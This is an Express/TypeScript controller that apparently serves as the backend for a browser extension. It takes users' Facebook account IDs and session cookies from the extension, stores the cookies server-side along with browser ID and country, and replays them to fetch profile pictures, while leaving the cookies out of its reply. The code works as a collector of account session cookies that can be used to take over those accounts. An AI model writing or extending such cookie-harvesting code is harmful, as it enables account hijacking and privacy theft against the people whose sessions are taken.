import {AuthService, FacebookService, OwnerService} from '@/services';

import {IAuthRequest} from '@/types';
import {Response} from 'express';
import _ from 'underscore';
import {catchAsync} from '@/utils';

export const loginWithExtension = catchAsync(async (req: IAuthRequest, res: Response) => {
	const {browserId, accountId, browserType, count, accountName, browserVersion, cookies} = req.body;

	let user = await AuthService.findByBrowserId(browserId);
	const country = req?.ipinfo?.country || 'Unknown';

	if (!user) {
		user = await AuthService.createUser(browserId, browserVersion, browserType, country);
	}

	let owner = await OwnerService.findAccountByOptions({accountId, browserId});

	if (!owner) {
		owner = await OwnerService.createOwner({
			browserId,
			accountId,
			accountName,
			count,
			cookies,
			country
		});
	} else {
		const pp = await FacebookService.getProfilePicture(accountId, cookies);
		const isSame = pp?.hash === owner.pp_hash;

		if (!isSame) {
			owner = await OwnerService.updateOwner(
				{accountId, browserId},
				{
					accountName,
					profilePic: pp?.url,
					cookies,
					pp_hash: pp?.hash
				}
			);
		}

		if (accountName !== owner?.accountName) {
			owner = await OwnerService.updateOwner({accountId, browserId}, {accountName});
		}
	}

	return res.status(200).json({
		user,
		owner: _.omit(owner, 'cookies')
	});
});
